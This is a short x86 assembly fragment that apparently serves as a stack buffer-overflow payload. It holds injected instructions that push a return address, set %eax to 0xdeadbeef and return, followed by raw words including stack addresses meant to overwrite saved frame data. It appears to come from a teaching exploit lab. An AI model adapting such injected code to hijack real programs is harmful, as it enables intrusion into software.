pushl $ 0x804861f

movl $0xdeadbeef,%eax

ret

.align 4
.long 0xf8e0e300
.long 0x00000001
.long 0x00000002
.long 0xbfffefd8
.long 0xbfffefa0


